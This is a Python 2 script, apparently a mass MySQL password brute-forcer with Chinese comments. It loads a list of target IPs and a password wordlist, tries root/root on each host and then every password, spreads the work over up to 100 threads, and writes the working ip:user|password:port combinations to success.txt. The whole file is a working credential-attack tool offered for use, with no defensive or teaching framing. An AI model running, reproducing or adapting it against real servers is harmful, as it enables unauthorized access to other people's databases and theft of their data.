# -*- coding:utf-8 -*-

import socket
socket.setdefaulttimeout(0.5)

import pymysql
import time
import ConfigParser
import queue
import threading


def success(x):
    with open('success.txt', 'a+')as a:
        a.write(x + "\n")


def failed(x):
    name = '端口开放_密码错误'.decode('utf-8') + '.txt'
    with open(name, 'a+')as a:
        a.write(x + "\n")


def check(ip, port):
    print 'Check IP Alive : ' + ip
    try:
        connx = pymysql.connect(host=ip, user='root', passwd='root', db='mysql', port=port,connect_timeout=5)
        cur = connx.cursor()
        sql = 'show databases;'
        cur.execute(sql)
        res = cur.fetchall()
        if 'Learn' in res:
            failed(ip)
        else:
            res = ip + ':' + 'root' + '|' + 'root' + ':' + str(port)
            success(res)
            return '777'
    except Exception, e:
        print e
        if str(e).find('Access denied') != -1:
            failed(ip)
        elif (str(e).find('many connections') != -1):
            # 连接过多,暂停1秒
            time.sleep(1)
            pass
        elif (str(e).find('Can\'t connect') != -1):
            # 端口未开放,退出
            return '666'
        elif (str(e).find('Lost connection') != -1):
            # 端口未开放,退出
            return '666'
        elif (str(e).find('not allowed') != -1):
            # 端口未开放,退出
            return '666'
        else:
            # 其他错误，记录并退出
            pass


def scan(ip,username,passwords,port,pool):
    ress = check(ip, port)
    if ress == '666':
        pool.add_thread()
        return
    elif ress == '777':
        pool.add_thread()
        return
    else:
        for password in passwords:
            print 'Scan : ' + ip + ':' + username + '|' + password + ':' + str(port)
            try:
                connx = pymysql.connect(host=ip, user=username, passwd=str(password), db='mysql', port=port,connect_timeout=3)
                cur = connx.cursor()
                sql = 'show databases;'
                cur.execute(sql)
                res = cur.fetchall()
                if 'Learn' in res:
                    failed(ip)
                else:
                    res = ip + ':' + username + '|' + password + ':' + str(port)
                    success(res)
                    pool.add_thread()
                    return
            except Exception, e:
                print e




class MyThreadPool:
    def __init__(self, maxsize=100):
        self.maxsize = maxsize
        self._pool = queue.Queue(maxsize)   # 使用queue队列，创建一个线程池
        for _ in range(maxsize):
            self._pool.put(threading.Thread)
    def get_thread(self):
        return self._pool.get()

    def add_thread(self):
        self._pool.put(threading.Thread)


if __name__ == '__main__':

    cfg = ConfigParser.ConfigParser()
    cfg.read('Config.ini')
    user = cfg.get("Config", "user")
    thread_s = int(cfg.get("Config", "threads"))
    port = int(cfg.get("Config", "port"))
    pool = MyThreadPool(thread_s)  # 设定线程池中最多只能有5个线程类
    New_start = raw_input(unicode('导入IP:', 'utf-8').encode('gbk'))  # line:190
    New_start = New_start.replace('"', '').replace("'", '')
    IP_list = list(set([x.strip() for x in open(New_start,'r').readlines()]))

    Password_list_ = list(set([x.strip() for x in open('password.txt','r').readlines()]))


    for i in IP_list:
        t = pool.get_thread()   # 每个t都是一个线程类
        obj = t(target=scan, args=(i, user,Password_list_,port,pool)) # 这里的obj才是正真的线程对象
        obj.start()
